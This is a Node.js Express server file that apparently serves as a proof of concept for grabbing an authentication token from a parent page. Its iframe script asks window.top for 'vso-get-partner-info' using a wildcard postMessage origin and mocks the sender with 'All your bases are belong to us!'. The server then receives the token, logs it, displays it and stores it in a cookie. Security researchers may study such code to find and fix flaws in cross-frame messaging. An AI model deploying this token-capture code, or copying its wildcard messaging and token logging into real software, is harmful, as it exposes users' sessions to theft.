const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const nocache = require('nocache');

function getHtml(body) {
  return `
<html>
  <head>
    <script>
      const guid = new Date().getMilliseconds();
      window.onload = function() {
        const payload = {
          id: guid,
          type: 'vso-get-partner-info'
        }
        window.top.postMessage(payload, '*');
      }
      window.addEventListener("message", receiveMessage, false);
      function acknowledgeMessage(token, guid) {
        const payload = {
          id: guid,
          type: 'vso-get-partner-info-result',
          result: 'success',
          message: 'All your bases are belong to us! token: ' + token + ', id: ' + guid
        }
        window.top.postMessage(payload, '*');
      }
      function receiveMessage(event) {
        console.log('in iframe, message received: ', event.data.token);
        if (event && event.data && event.data.token) {
          const token = event.data.token;
          const guid = event.data.responseId;
          acknowledgeMessage(token, guid);
          fetch('./', { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "token=" + token})
            .then((response) => { 
              if (response.ok) { 
                window.location.href="./?" + new Date().getTime(); 
              } 
            } 
          );
        }
      }
    </script>
  </head>
  <body>
    ${body}
  </body>
</html>
`};

function getRenderedPage(req, res) {
  console.log('GET / cookie monster sees: ', req.cookies);
  const token = req.cookies.token;
  res.status(200)
    .set('Content-Type', 'text/html')
    .send(getHtml(`HEROKU frame waiting for postMessage,<br />cookie token is: ${token}`));
  res.end();
}

express()
  .use(express.static(path.join(__dirname, 'public')))
  .use(bodyParser.urlencoded({ extended: true }))
  .use(cookieParser())
  .use(nocache())
  .set('etag', false)
  .get('/', getRenderedPage)
  .get('/platform-auth', getRenderedPage)
  .post('/', (req, res) => {
    console.log('POST / body is: ', req.body);
    res.cookie('token', req.body.token, { maxAge: 900000, httpOnly: true, sameSite: 'None', secure: true })
      .set('Content-Type', 'text/html')
      .redirect('./');
    res.end();
  })
  .listen(PORT, () => console.log(`Listening on ${ PORT }`));
